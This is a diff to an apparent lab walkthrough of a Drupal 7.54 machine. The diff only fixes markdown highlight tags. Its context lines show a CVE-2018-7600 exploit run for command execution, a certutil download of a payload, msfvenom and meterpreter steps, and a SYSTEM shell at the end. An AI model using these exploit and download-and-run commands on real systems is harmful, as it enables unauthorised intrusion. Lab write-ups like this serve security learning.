@@ -51,7 +51,7 @@ By accessing the web server, we can find the website that Drupal CMS is running.
 
 At first, try to figure out its version, we can see the file "CHANGELOG.txt".<br>
 The version is "Drupal 7.54"
-*{% highlight shell %}
+{% highlight shell %}
 root@kali:~# curl -s http://10.10.10.9/CHANGELOG.txt | head
 
 Drupal 7.54, 2017-02-01
@@ -130,7 +130,7 @@ root@kali:~/CVE-2018-7600# python drupa7-CVE-2018-7600.py -c "whoami" http://10.
 nt authority\iusr
 
 root@kali:~/CVE-2018-7600# 
-*{% endhighlight %}
+{% endhighlight %}
 
 Next, to obtain a reverse shell, generate a payload with msfvenom.
 {% highlight shell %}
@@ -168,7 +168,7 @@ root@kali:~/CVE-2018-7600# python drupa7-CVE-2018-7600.py -c "certutil.exe -urlc
 CertUtil: -URLCache command completed successfully.
 
 root@kali:~/CVE-2018-7600#
-*{% endhighlight %}
+{% endhighlight %}
 
 After that, set a handler for the meterpreter shell.
 {% highlight shell %}
@@ -305,7 +305,7 @@ whoami
 nt authority\system
 
 C:\inetpub\drupal-7.54>
-*{% endhighlight %}
+{% endhighlight %}
 
 root.txt is in the directory "C:\Users\Administrator\Desktop".
 {% highlight shell %}
